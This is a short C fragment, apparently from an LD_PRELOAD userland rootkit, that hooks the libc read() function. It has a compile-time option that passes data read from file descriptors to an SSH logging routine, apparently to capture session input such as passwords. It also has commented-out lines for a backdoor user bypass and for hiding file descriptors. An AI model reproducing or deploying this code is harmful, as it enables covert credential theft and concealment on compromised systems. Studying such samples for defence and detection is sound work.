ssize_t read(int fd, void *buf, size_t n){
    hook(CREAD);
    //if(is_bdusr()) return (ssize_t)call(CREAD, fd, buf, n);

    /*if(hidden_fd(fd)){
        errno = EIO;
        return -1;
    }*/

    ssize_t o = (ssize_t)call(CREAD, fd, buf, n);
#ifdef LOG_SSH
    return log_ssh(fd, buf, o);
#else
    return o;
#endif
}